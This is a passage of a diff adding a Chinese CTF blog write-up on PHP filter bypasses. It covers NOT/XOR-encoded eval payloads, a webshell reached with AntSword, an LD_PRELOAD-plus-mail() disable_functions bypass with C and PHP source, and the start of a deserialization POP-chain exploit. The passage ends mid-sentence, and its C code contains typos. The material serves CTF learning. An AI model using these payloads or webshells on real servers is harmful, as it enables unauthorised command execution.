@@ -113,7 +113,7 @@
 				
 				<section class="switch-part switch-part2">
 					<div class="widget tagcloud" id="js-tagcloud">
-						<a href="/tags/SSRF/" style="font-size: 11.67px;">SSRF</a> <a href="/tags/SSTI/" style="font-size: 13.33px;">SSTI</a> <a href="/tags/http/" style="font-size: 11.67px;">http</a> <a href="/tags/java/" style="font-size: 13.33px;">java</a> <a href="/tags/misc/" style="font-size: 11.67px;">misc</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 13.33px;">php特性</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 18.33px;">sql注入</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 15px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">文件泄露及代码审计</a> <a href="/tags/%E6%A8%A1%E6%9D%BF/" style="font-size: 13.33px;">模板</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" style="font-size: 16.67px;">脚本编写</a>
+						<a href="/tags/SSRF/" style="font-size: 11.43px;">SSRF</a> <a href="/tags/SSTI/" style="font-size: 12.86px;">SSTI</a> <a href="/tags/http/" style="font-size: 11.43px;">http</a> <a href="/tags/java/" style="font-size: 12.86px;">java</a> <a href="/tags/misc/" style="font-size: 11.43px;">misc</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 12.86px;">php特性</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 18.57px;">sql注入</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 15.71px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">文件泄露及代码审计</a> <a href="/tags/%E6%A8%A1%E6%9D%BF/" style="font-size: 14.29px;">模板</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" style="font-size: 17.14px;">脚本编写</a>
 					</div>
 				</section>
 				
@@ -168,6 +168,157 @@
 	</div>
 </nav>
       <div class="body-wrap">
+  
+    <article id="post-取反或异或绕过以及disable_function禁用绕过" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/09/16/%E5%8F%96%E5%8F%8D%E6%88%96%E5%BC%82%E6%88%96%E7%BB%95%E8%BF%87%E4%BB%A5%E5%8F%8Adisable_function%E7%A6%81%E7%94%A8%E7%BB%95%E8%BF%87/" class="article-date">
+  	<time datetime="2021-09-15T16:00:00.000Z" itemprop="datePublished">2021-09-16</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/09/16/%E5%8F%96%E5%8F%8D%E6%88%96%E5%BC%82%E6%88%96%E7%BB%95%E8%BF%87%E4%BB%A5%E5%8F%8Adisable_function%E7%A6%81%E7%94%A8%E7%BB%95%E8%BF%87/">
+        取反或异或绕过以及disable_function禁用绕过
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="取反或异或绕过以及disable-function禁用绕过"><a href="#取反或异或绕过以及disable-function禁用绕过" class="headerlink" title="取反或异或绕过以及disable_function禁用绕过"></a>取反或异或绕过以及disable_function禁用绕过</h1><p>打开页面后，我们查源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;code&#x27;]))&#123;</span><br><span class="line">    $code=$_GET[&#x27;code&#x27;];</span><br><span class="line">        if(strlen($code)&gt;40)&#123;</span><br><span class="line">            die(&quot;This is too Long.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code))&#123;</span><br><span class="line">            die(&quot;NO.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    @eval($code);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;  </span><br></pre></td></tr></table></figure>
+<p>发现有两个过滤</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. strlen($code)&gt;40</span><br><span class="line"></span><br><span class="line">2. preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code)</span><br></pre></td></tr></table></figure>
+<p>可以知道我们get提交的的数据的长度要大于40，而且正则过滤了大小写字母和数字，所以我们此时发现各类函数好像都被过滤了，所以我们可以使用异或或取反来绕过，构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br><span class="line">//$&#123;_GET&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br></pre></td></tr></table></figure>
+<p>来查看php版本，发现它的disable_function过滤掉了许多的函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">禁用的函数：</span><br><span class="line">pcntl_alarm,</span><br><span class="line">pcntl_fork,</span><br><span class="line">pcntl_waitpid,</span><br><span class="line">pcntl_wait,</span><br><span class="line">pcntl_wifexited,</span><br><span class="line">pcntl_wifstopped,</span><br><span class="line">pcntl_wifsignaled,</span><br><span class="line">pcntl_wifcontinued,</span><br><span class="line">pcntl_wexitstatus,</span><br><span class="line">pcntl_wtermsig,</span><br><span class="line">pcntl_wstopsig,</span><br><span class="line">pcntl_signal,</span><br><span class="line">pcntl_signal_get_handler,</span><br><span class="line">pcntl_signal_dispatch,</span><br><span class="line">pcntl_get_last_error,</span><br><span class="line">pcntl_strerror,</span><br><span class="line">pcntl_sigprocmask,</span><br><span class="line">pcntl_sigwaitinfo,</span><br><span class="line">pcntl_sigtimedwait,</span><br><span class="line">pcntl_exec,</span><br><span class="line">pcntl_getpriority,</span><br><span class="line">pcntl_setpriority,</span><br><span class="line">pcntl_async_signals,</span><br><span class="line">system,</span><br><span class="line">exec,</span><br><span class="line">shell_exec,</span><br><span class="line">popen,proc_open,</span><br><span class="line">passthru,</span><br><span class="line">symlink,</span><br><span class="line">link,</span><br><span class="line">syslog,</span><br><span class="line">imap_open,ld,dl</span><br></pre></td></tr></table></figure>
+<p>所以我们可以利用eval()函数来上传一个木马并连上蚁剑来获得shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$str1=&quot;assert&quot;;</span><br><span class="line">echo urlencode(~$str1);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>可以利用上面的脚本来构造木马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert(eval($_POST[mochu7]))</span><br></pre></td></tr></table></figure>
+<p>因此，我们可以构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%92%90%9C%97%8A%C8%A2%D6%D6);</span><br></pre></td></tr></table></figure>
+<p>然后post提交</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mochu7=phpinfo();</span><br></pre></td></tr></table></figure>
+<p>发现可以看见php版本，所以我们使用蚁剑来连接到后台，然后发现flag文件，但是什么都读不出来，然后点击/readflag，是乱码，所以发现由于disable_function禁用了太多的命令函数了，所以这个shell有很多命令都执行不了，但是蚁键有个插件是绕过disable_function的，选用并选PHP7_GC_UAF模式，然后在蚁剑命令行输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/readflag</span><br></pre></td></tr></table></figure>
+<p>绕过即可，但是我是不能用，不知为何，所以可以使用LD_preload+mail劫持so来执行系统命令</p>
+<h2 id="LD-prelosd-mail劫持so来执行系统命令"><a href="#LD-prelosd-mail劫持so来执行系统命令" class="headerlink" title="LD_prelosd+mail劫持so来执行系统命令"></a>LD_prelosd+mail劫持so来执行系统命令</h2><p>通常在webshell中无法执行命令的话，有三种情况</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. php.ini中使用disable_functions指示器禁用了system()、exec()等命令执行的函数</span><br><span class="line"></span><br><span class="line">2. web进程运行在rbash这类受限shell环境中</span><br><span class="line"></span><br><span class="line">3. waf拦劫</span><br></pre></td></tr></table></figure>
+<p>第一种是完全不能执行命令，而另外两种是可以执行少量命令，而绕过第一种disable_function的方法有四种</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. 攻击后端组件，寻找存在命令注入的、web应用常用的后端组件，如：ImageMagick 的魔图漏洞、bash 的破壳漏洞</span><br><span class="line"></span><br><span class="line">2. 寻找漏网函数，如比较偏的函数： popen()、proc_open()、pcntl_exec()</span><br><span class="line"></span><br><span class="line">3. mod_cgi模式，尝试修改.htaccess文件来调整请求访问路由，来绕过php.ini中的任何限制</span><br><span class="line"></span><br><span class="line">4. 利用环境变量LD_PRELOAD劫持系统函数，让外部程序加载恶意*.so，达到执行系统命令的效果</span><br></pre></td></tr></table></figure>
+<p>注意：ImageMagick存在命令注入漏洞的版本是v6.9.3-9或v7.0.1-0</p>
+<p>我们可是尝试各种罕见的函数以及看php版本中是否有禁用mod_cgi模式，但是这里我们讲解第四种LD_PRELOAD劫持系统函数的方法</p>
+<p>漏洞原理：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">控制web启动新进程a.bin时，a.bin内部会调用系统函数b()，而b()位于系统共享对象c.so中，所以系统进程会加载c.so，但是在加载c.so前会优先加载可控的c_evil.so，而c_evil.so中有和b()同名的恶意函数，由于c_evil.so的优先级比较高，所以其实最后函数执行的地方会在c_evil.so中，而不是系统中，而c_evil.so可控，所以可以达到执行恶意代码的目的，因此，如果我们要实现上面的操作，我们可以做一下几步</span><br></pre></td></tr></table></figure>
+<ol>
+<li><p>查看进程调用系统函数明细</p>
+<p> 命令：ldd /usr/bin/id  #查看调用的API</p>
+<p> 命令：nm -D /usr/bin/id 2&gt;&amp;1 或 readelf -Ws /usr/bin/id #查看该程序可能会调用的系统API明细</p>
+<p> 命令：strace -f /usr/bin/id 2&gt;&amp;1 #跟踪实际API调用情况</p>
+</li>
+<li><p>操作系统环境下劫持系统函数注入代码</p>
+<p> 由于被劫持系统函数需要有我们重新实现一次，所以函数原型必须一致，所以为了方便，一般选择常用无参的系统函数，如：getuid()函数就比较合适，可以使用man 2 getuid来看函数原型</p>
+</li>
+<li><p>找寻内部启动新进程的 PHP 函数</p>
+</li>
+<li><p>PHP 环境下劫持系统函数注入代码</p>
+</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对于第二步，我们可以编写原型的getuid()函数</span><br></pre></td></tr></table></figure>
+<p>#include &lt;unistd.h&gt;<br>#include &lt;sys/types.h&gt;</p>
+<p>uid_t getuid(void)<br>{<br>    system(“echo ‘!! evil command here’”);<br>    return 0;<br>}</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我们再执行</span><br></pre></td></tr></table></figure>
+<p>gcc -shared -fPIC getuid_shadow.c -o getuid_shadow.so</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">编译成共享对象，最后借助环境变量LD_PRELOAD劫持系统函数getuid()来获取控制权，然后用</span><br></pre></td></tr></table></figure>
+<p>LD_PRELOAD=/root/getuid_shadow.so /usr/bin/id</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">测试代码是否成功执行，我在ubuntu发现不行，不知道为什么</span><br><span class="line"></span><br><span class="line">虽然LD_PRELOAD为我们提供了劫持系统函数的能力，但是我们需要php启动外部程序才可以，所以我们可以尝试三个进程，分别是处理图片、请求网页、发送邮件</span><br><span class="line"></span><br><span class="line">处理图片</span><br><span class="line">image.php</span><br><span class="line">```&lt;?php </span><br><span class="line">	$img=new Imagick();</span><br><span class="line">	$img-&gt;newImage(500,300,&#x27;black&#x27;,&#x27;png&#x27;)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>运行strace -f php image.php 2&gt;&amp;1 | grep -A2 -B2 execve 查看 Imagick() 是否启动新进程，发现只有一个execve是启动php解释器，必须要有第二个execve才说明是开启新进程</p>
+<p>请求网页</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$ch=curl_init();</span><br><span class="line">	curl_setopt($ch,CURLOPT_URL,&quot;www.baidu.com&quot;);</span><br><span class="line">	curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);</span><br><span class="line">	$output=curl_exec($ch);</span><br><span class="line">	curl_close($ch);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>运行 strace -f php http.php 2&gt;&amp;1 | grep -A2 -B2 execve 查看 curl_init() 是否启动新进程，发现不是想要的</p>
+<p>发送邮件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	mail(&quot;a&quot;,&quot;h&quot;,&quot;c&quot;,&quot;d&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>运行 strace -f php mail.php 2&gt;&amp;1 | grep -A2 -B2 execve 查看 mail() 是否启动新进程，发现有两个execve()，满足需求</p>
+<p>因此，我们可以在php环境下劫持系统函数注入代码<br>mail.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	putenv(&quot;LD_PRELOAD=/root/getuid_shadow.so&quot;);</span><br><span class="line">	mail(&quot;a&quot;,&quot;b&quot;,&quot;c&quot;,&quot;d&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>将main.php文件和getuid_shadow.so文件放进同一目录里，/var/www/<br>执行main.php后，发现在不借助任何php命令执行函数的情况下执行了getuid_shadow.so文件的命令</p>
+<p>根据前面的mail.php，可以写一个木马bypass_disablefunc.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo &quot;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    $cmd = $_GET[&quot;cmd&quot;];</span><br><span class="line">    $out_path = $_GET[&quot;outpath&quot;];</span><br><span class="line">    $evil_cmdline = $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;;</span><br><span class="line">    echo &quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot; . $evil_cmdline . &quot;&lt;/p&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    putenv(&quot;EVIL_CMDLINE=&quot; . $evil_cmdline);</span><br><span class="line"></span><br><span class="line">    $so_path = $_GET[&quot;sopath&quot;];</span><br><span class="line">    putenv(&quot;LD_PRELOAD=&quot; . $so_path);</span><br><span class="line"></span><br><span class="line">    mail(&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;);</span><br><span class="line"></span><br><span class="line">    echo &quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot; . nl2br(file_get_contents($out_path)) . &quot;&lt;/p&gt;&quot;; </span><br><span class="line"></span><br><span class="line">    unlink($out_path);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>其中cmd参数是待执行命令，outpath参数为保存命令执行输出结果的文件路径，sopath参数是指定劫持系统函数的共享对象的绝对路径(如：/var/www/bypass_disablefunc_x64.so）</p>
+<p>木马其中的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">putenv(&quot;EVIL_CMDLINE=&quot; . $evil_cmdline);</span><br></pre></td></tr></table></figure>
+<p>是向 bypass_disablefunc_x64.so 文件传递具体的命令行信息的</p>
+<p>但是在真实环境中，存在两方面问题：一是，某些环境中，web 禁止启用 senmail、甚至系统上根本未安装 sendmail，也就谈不上劫持 getuid()，通常的 www-data 权限又不可能去更改 php.ini 配置、去安装 sendmail 软件；二是，即便目标可以启用 sendmail，由于未将主机名（hostname 输出）添加进 hosts 中，导致每次运行 sendmail 都要耗时半分钟等待域名解析超时返回，www-data 也无法将主机名加入 hosts（如，127.0.0.1    lamp、lamp.、lamp.com），所以我们可以使用__attribute__((constructor)) 修饰的函数来代替，而且用 LD_PRELOAD 手法突破 disable_functions 无法做到百分百成功，正因为这个原因，我们不要局限于仅劫持某一函数，而应考虑劫持共享对象，bypass_disablefunc.c源码:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#define _GNU_SOURCE</span><br><span class="line"></span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line"></span><br><span class="line">__attribute__((__contructor__)) void preloadme(void)</span><br><span class="line">&#123;</span><br><span class="line">	unsetenv(&quot;LD_PRELOAD&quot;);</span><br><span class="line">	const char* cmdline=getenv(&quot;EVIL_CMDLINE&quot;):</span><br><span class="line">	system(cmdline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>用命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC bypass_disablefunc.c -o bypass_disablefunc_x64.so</span><br></pre></td></tr></table></figure>
+<p>生成bypass_disablefunc_x64.so即可，32位的加上-m32选项即可</p>
+<p>回到题目本身，我们发现有disable_function时，我们就是用LD_PRELOAD+mail来绕过，我们可以在<a target="_blank" rel="noopener" href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD%EF%BC%8C%E4%B8%8B%E8%BD%BD%E5%B7%B2%E7%BB%8F%E5%86%99%E5%A5%BD%E7%9A%84bypass_disablefunc_x64.so%EF%BC%8C%E7%94%A8%E8%9A%81%E5%89%91%E4%B8%8A%E4%BC%A0%E5%88%B0/var/tmp%E6%96%87%E4%BB%B6%E5%A4%B9%E4%B8%AD%EF%BC%8C%E7%84%B6%E5%90%8E%E5%B0%86%E4%B8%8A%E9%9D%A2%E7%9A%84%E6%9C%A8%E9%A9%AC%E6%94%B9%E4%B8%80%E4%B8%8B">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD，下载已经写好的bypass_disablefunc_x64.so，用蚁剑上传到/var/tmp文件夹中，然后将上面的木马改一下</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// exp.php</span><br><span class="line">$cmd = &quot;/readflag&quot;;</span><br><span class="line">$out_path = &quot;/var/tmp/1.txt&quot;;</span><br><span class="line">$evil_cmdline = $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;;</span><br><span class="line">putenv(&quot;EVIL_CMDLINE=&quot; . $evil_cmdline);</span><br><span class="line">$so_path = &quot;/var/tmp/bypass_disablefunc_x64.so&quot;;</span><br><span class="line">putenv(&quot;LD_PRELOAD=&quot; . $so_path);</span><br><span class="line">mail(&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;);</span><br><span class="line">echo &quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot; . nl2br(file_get_contents($out_path)) . &quot;&lt;/p&gt;&quot;;</span><br><span class="line">unlink($out_path);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>然后也用蚁剑上传上去即可，然后用include函数来包含exp.php文件，从而启动新进程来触发漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=$_=~(%A0%B8%BA%AB);$&#123;$_&#125;[__]($&#123;$_&#125;[___]);&amp;__=assert&amp;___=include%20%22/var/tmp/exp.php%22;</span><br></pre></td></tr></table></figure>
+<p>即可获得flag</p>
+<h2 id="实例2-天翼杯easy-eval"><a href="#实例2-天翼杯easy-eval" class="headerlink" title="实例2(天翼杯easy_eval)"></a>实例2(天翼杯easy_eval)</h2><p>打开页面，可以看见源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php   </span><br><span class="line">class A&#123;   </span><br><span class="line">    public $code = &quot;&quot;;   </span><br><span class="line">    function __call($method,$args)&#123;   </span><br><span class="line">        eval($this-&gt;code);   </span><br><span class="line">           </span><br><span class="line">    &#125;   </span><br><span class="line">    function __wakeup()&#123;   </span><br><span class="line">        $this-&gt;code = &quot;&quot;;   </span><br><span class="line">    &#125;   </span><br><span class="line">&#125;   </span><br><span class="line">  </span><br><span class="line">class B&#123;   </span><br><span class="line">    function __destruct()&#123;   </span><br><span class="line">        echo $this-&gt;a-&gt;a();   </span><br><span class="line">    &#125;   </span><br><span class="line">&#125;   </span><br><span class="line">if(isset($_REQUEST[&#x27;poc&#x27;]))&#123;   </span><br><span class="line">    preg_match_all(&#x27;/&quot;[BA]&quot;:(.*?):/s&#x27;,$_REQUEST[&#x27;poc&#x27;],$ret);   </span><br><span class="line">    if (isset($ret[1])) &#123;   </span><br><span class="line">        foreach ($ret[1] as $i) &#123;   </span><br><span class="line">            if(intval($i)!==1)&#123;   </span><br><span class="line">                exit(&quot;you want to bypass wakeup ? no !&quot;);   </span><br><span class="line">            &#125;   </span><br><span class="line">        &#125;   </span><br><span class="line">        unserialize($_REQUEST[&#x27;poc&#x27;]);       </span><br><span class="line">    &#125;   </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">&#125;else&#123;   </span><br><span class="line">    highlight_file(__FILE__);   </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>我们可以在源码中可以看见一个eval()这个危险函数，所以我们可以试着构造一个pop链来控制$this-&gt;code参数的值来执行恶意代码，而__call()这个魔术方法是在类调用不可访问对象时触发的，所以我们可以写一个exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class A&#123;</span><br><span class="line">	public $code=&#x27;eval($_POST[1]);&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">class B&#123;</span><br><span class="line">	public $a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$b=new B();</span><br><span class="line">$b-&gt;a=new A();</span><br><span class="line"></span><br><span class="line">echo serialize($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>可以得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;B&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:4:&quot;code&quot;;s:15:&quot;eval($_POST[1]);&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>因为正则过滤中过滤了B和A的大写，但是php中的类对大小写不怎么区分，所以可以使用小写的b和a，而反序列化时会触发__wakeup()的魔术方法，而如果序列化字符串中对象属性个数的值大于真实个数的属性时，会绕过__wakeup()魔术方法，所以最后的序列化字符串为</p>
